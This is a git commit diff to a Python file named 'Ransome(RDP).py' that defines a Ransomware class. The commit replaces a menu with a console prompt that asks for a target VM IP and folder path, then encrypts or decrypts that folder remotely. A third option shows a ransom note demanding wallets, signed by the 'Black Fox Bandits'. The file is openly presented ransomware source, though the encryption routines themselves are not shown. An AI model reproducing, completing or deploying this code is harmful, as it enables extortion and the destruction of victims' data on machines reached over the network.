28e864ff5900d2bbee4c70569ecb6f23a498bb21
Sierra Maldonado <122700822+Magicwolfes@users.noreply.github.com>
2023-06-21 14:14:42 -0400

    Update Ransome(RDP).py

--- Ransome(RDP).py
+++ Ransome(RDP).py
@@ -13,6 +13,8 @@ def load_key():
     return open("key.key", "rb").read()
 
 
+
+
 class Ransomware:
     def __init__(self):
         self.sysRoot = os.path.expanduser('~')
@@ -64,19 +66,29 @@ class Ransomware:
 
         ransom_note_text = "You have been bamboozled by the Black Fox Bandits. Please hand over your wallets."
         subprocess.run(f"msg * {ransom_note_text}", shell=True)
-
-    def attack_windows_server(self):
-        target_ip = input("Enter the target IP address: ")
-        
-        # Create menu items
-        encrypt_item = MenuItem("Encrypt", lambda: self.encrypt_folder_on_vm(target_ip, input("Enter the folder path to encrypt: ")))
-        popup_item = MenuItem("Pop-up", self.ransom_note)
-        decrypt_item = MenuItem("Decrypt", lambda: self.decrypt_folder_on_vm(target_ip, input("Enter the folder path to decrypt: ")))
-        exit_item = MenuItem("Exit", exit)
-
-        # Create menu
-        menu = MenuItem([encrypt_item, popup_item, decrypt_item, exit_item])
-        menu.show()
-
+            
 ransomware = Ransomware()
-ransomware.attack_windows_server()
+
+
+# Add choices at the bottom
+print("Choose an action:")
+print("1. Encrypt folder on a different VM")
+print("2. Decrypt folder on a different VM")
+print("3. Display Ransom Note on Windows")
+choice = input("Enter your choice (1/2/3): ")
+
+if choice == "1":
+    target_vm_ip = input("Enter the target VM IP: ")
+    folder_path = input("Enter the folder path to encrypt: ")
+    ransomware.encrypt_folder_on_vm(target_vm_ip, folder_path)
+    print("Encryption completed.")
+elif choice == "2":
+    target_vm_ip = input("Enter the target VM IP: ")
+    folder_path = input("Enter the folder path to decrypt: ")
+    ransomware.decrypt_folder_on_vm(target_vm_ip, folder_path)
+    print("Decryption completed.")
+elif choice == "3":
+    ransomware.ransom_note()
+    print("Ransom note displayed.")
+else:
+    print("Invalid choice. Please choose a valid option.")
